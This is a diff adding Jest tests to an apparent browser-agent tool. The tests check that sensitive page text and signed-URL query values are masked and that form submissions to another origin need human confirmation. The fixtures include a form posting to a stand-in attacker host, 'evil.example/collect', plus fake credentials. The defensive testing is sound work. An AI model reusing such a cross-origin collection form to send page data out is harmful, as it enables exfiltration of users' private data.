@@ -65,6 +65,20 @@ describe('resolveRef / performByRef', () => {
     expect(resolveRef(snapshotId, ref).ok).toBe(false);
   });
 
+  it('rejects an element moved to another row or retargeted since the observation (node reused by a re-render)', () => {
+    document.body.innerHTML = `
+      <ul><li>Alerte A <button>Supprimer</button></li><li>Alerte B <span></span></li></ul>
+      <a href="/aide?id=1">Aide</a>`;
+    const { snapshotId, elements } = observePage(document, ids);
+    const remove = elements.find((e) => e.name === 'Supprimer')?.ref ?? '';
+    const help = elements.find((e) => e.name === 'Aide')?.ref ?? '';
+    const button = document.querySelector('button');
+    if (button) document.querySelectorAll('li')[1]?.append(button); // same node, now in row B
+    expect(resolveRef(snapshotId, remove)).toMatchObject({ ok: false, error: { code: 'TARGET_NOT_FOUND' } });
+    document.querySelector('a')?.setAttribute('href', '/aide?id=2');
+    expect(resolveRef(snapshotId, help)).toMatchObject({ ok: false, error: { code: 'TARGET_NOT_FOUND' } });
+  });
+
   it('still requires a human for an irreversible element, even when proposed by recovery', () => {
     const ref = refOf('Supprimer l’alerte');
     const step = { id: 's', kind: 'click' as const, target: { tag: 'button', attributes: {}, css: 'x' } };
@@ -116,3 +130,89 @@ describe('review regressions', () => {
   });
 });
 
+
+describe('what leaves the page (security review)', () => {
+  it('never sends the text of a subtree marked sensitive, as context, section or label', () => {
+    document.body.innerHTML = `
+      <table><tr><td data-sensitive>FR76 3000 6000 0112 3456 7890 189</td><td><button>Copier</button></td></tr></table>
+      <section><h2 data-private>Compte de Jeanne Martin</h2><button>Exporter</button></section>
+      <span id="lbl"><span data-flowpilot-sensitive>4970 1234</span> Carte</span><button aria-labelledby="lbl">Voir</button>`;
+    const sent = JSON.stringify(observePage(document, ids));
+    expect(sent).toContain('Copier');
+    expect(sent).not.toContain('FR76');
+    expect(sent).not.toContain('Jeanne');
+    expect(sent).not.toContain('4970');
+  });
+
+  it('a marker on an ancestor also hides the text (page heading, label target)', () => {
+    document.body.innerHTML = `
+      <header data-private><h1>Compte de Jeanne Martin</h1><span id="who">Jeanne</span></header>
+      <main><button aria-labelledby="who">Profil</button><button>Exporter</button></main>`;
+    const sent = JSON.stringify(observePage(document, ids));
+    expect(sent).toContain('Exporter');
+    expect(sent).not.toContain('Jeanne');
+  });
+
+  it('sends link and page URLs with query values masked', () => {
+    document.body.innerHTML = `<a href="https://localhost/dl?X-Amz-Signature=s3cr3t&X-Amz-Credential=AKIA">Télécharger</a>`;
+    window.history.replaceState(null, '', '/page?email=jeanne%40example.com');
+    const observation = observePage(document, ids);
+    const sent = JSON.stringify(observation);
+    expect(sent).not.toContain('s3cr3t');
+    expect(sent).not.toContain('AKIA');
+    expect(sent).not.toContain('jeanne');
+    expect(observation.elements[0]?.attributes.href).toMatch(/^https:\/\/localhost\/dl\?X-Amz-Signature=~[0-9a-f]{16}&X-Amz-Credential=~[0-9a-f]{16}$/);
+    window.history.replaceState(null, '', '/');
+  });
+});
+
+describe('cross-origin submissions (Sprint 4)', () => {
+  const step = (kind: 'click' | 'press') =>
+    kind === 'press'
+      ? { id: 's', kind: 'press' as const, key: 'Enter' as const, target: { tag: 'input', attributes: {}, css: 'x' } }
+      : { id: 's', kind: 'click' as const, target: { tag: 'button', attributes: {}, css: 'x' } };
+
+  beforeEach(() => {
+    document.body.innerHTML = `
+      <form action="https://evil.example/collect" aria-label="Recherche">
+        <input aria-label="Mots-clés" /><button type="button">Aide</button><button type="submit">Rechercher</button>
+      </form>`;
+  });
+
+  it('a submit control or Enter that would send the form to another site needs a human', () => {
+    const elements = observePage(document, ids).elements;
+    const ref = (name: string) => elements.find((e) => e.name === name)?.ref ?? '';
+    expect(performByRef(step('click'), `snap-${seq}`, ref('Rechercher'), { confirmed: false })).toMatchObject({
+      ok: false,
+      error: { code: 'CONFIRMATION_REQUIRED' },
+    });
+    expect(performByRef(step('press'), `snap-${seq}`, ref('Mots-clés'), { confirmed: false })).toMatchObject({
+      ok: false,
+      error: { code: 'CONFIRMATION_REQUIRED' },
+    });
+  });
+
+  it('names the destination, and also catches a field linked to the form by form="id"', () => {
+    document.body.innerHTML = `
+      <form id="far" action="https://evil.example/collect"></form>
+      <input aria-label="Ville" form="far" />`;
+    const ref = observePage(document, ids).elements.find((e) => e.name === 'Ville')?.ref ?? '';
+    const result = performByRef(step('press'), `snap-${seq}`, ref, { confirmed: false });
+    expect(result).toMatchObject({ ok: false, error: { code: 'CONFIRMATION_REQUIRED' } });
+    expect(result.ok ? '' : result.error.message).toContain('https://evil.example');
+  });
+
+  it('a field whose Enter would send its form to another site is marked cross-origin (never offered to the model)', () => {
+    const elements = observePage(document, ids).elements;
+    expect(elements.find((e) => e.name === 'Mots-clés')?.sameOrigin).toBe(false);
+    expect(elements.find((e) => e.name === 'Rechercher')?.sameOrigin).toBe(false);
+    expect(elements.find((e) => e.name === 'Aide')?.sameOrigin).toBeUndefined();
+    document.body.innerHTML = `<form id="far" action="https://evil.example/collect"></form><input aria-label="Ville" form="far" />`;
+    expect(observePage(document, ids).elements.find((e) => e.name === 'Ville')?.sameOrigin).toBe(false);
+  });
+
+  it('a plain button inside that form submits nothing and is not gated', () => {
+    const ref = observePage(document, ids).elements.find((e) => e.name === 'Aide')?.ref ?? '';
+    expect(performByRef(step('click'), `snap-${seq}`, ref, { confirmed: false }).ok).toBe(true);
+  });
+});
